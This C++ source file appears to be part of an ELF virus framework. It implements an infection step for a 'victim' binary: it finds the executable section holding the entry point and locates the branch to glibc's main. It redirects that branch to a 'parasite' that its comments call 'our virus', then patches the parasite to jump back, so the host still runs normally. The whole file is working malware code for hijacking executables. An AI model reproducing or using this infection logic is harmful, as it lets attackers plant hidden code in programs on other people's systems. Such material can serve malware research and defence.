#include "redirection/libc_start_main.hh"
#include <optional>
#include "common/hex_dump.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/unistd.hh"
#include "redirection/find_libc_start_main.hh"
#include "redirection/patching.hh"

namespace vf::redirection {
namespace {
bool within_section(Elf64_Addr addr, const Elf64_Shdr& section_entry) {
  return (addr >= section_entry.sh_addr) &&
         (addr < section_entry.sh_addr + section_entry.sh_size);
}

bool matches_property(const Elf64_Shdr& section_entry) {
  return section_entry.sh_type == SHT_PROGBITS &&
         section_entry.sh_flags == (SHF_EXECINSTR | SHF_ALLOC);
}

}  // namespace

bool LibcStartMainPatcher::operator()(
    Elf64_Addr parasite_entry_address, Elf64_Off parasite_file_offset,
    Elf64_Off patch_offset_from_parasite_start, std::span<std::byte> victim) {
  auto& ehdr = reinterpret_cast<Elf64_Ehdr&>(*victim.data());
  auto* section_entry =
      reinterpret_cast<const Elf64_Shdr*>(&victim[ehdr.e_shoff]);

  // Find the instruction to patch:
  //  - Find the section that contains the entry address by checking vaddr.
  //  - Use the section file offset start to calculate the entry point file
  //    offset. Search for branch link instruction from that offset.
  //  - Calculate the vaddr for branch link instruction.
  //  - calculate the relative jump.
  for (size_t idx = 0; idx < ehdr.e_shnum; idx++, section_entry++) {
    if (within_section(ehdr.e_entry, *section_entry) &&
        matches_property(*section_entry)) {
      // Find the vaddr offset from the section start.
      auto vaddr_offset_from_section_start =
          ehdr.e_entry - section_entry->sh_addr;
      // Apply vaddr offset to find the instruction file offset to patch.
      auto entry_instruction_file_offset =
          vaddr_offset_from_section_start + section_entry->sh_offset;

      auto result = find_glibc_main_bl_instruction_offset(
          victim, entry_instruction_file_offset);
      if (result) {
        auto host_patch_offset = result.value();
        // the vaddr for the instruction to patch.
        auto vaddr_for_bl = section_entry->sh_addr + host_patch_offset -
                            section_entry->sh_offset;
        // cache the original bl instruction to find out the original
        // destination.
        auto original_destination =
            branch_destination(&victim[host_patch_offset], vaddr_for_bl);

        // unconditionally branch from the original function call to our virus.
        patch_branch(&victim[host_patch_offset], vaddr_for_bl,
                     parasite_entry_address);

        // patch the virus to jump back to original branch's destination.
        // Since the original code calls (branch-link/call) the function,
        // we also branch with return it here.
        patch_branch_with_return(
            &victim[parasite_file_offset + patch_offset_from_parasite_start],
            parasite_entry_address + patch_offset_from_parasite_start,
            original_destination);

        return true;
      } else {
        return false;
      }
    }
  }
  // Did not find the entry or libc main bl instruction.
  return false;
}

}  // namespace vf::redirection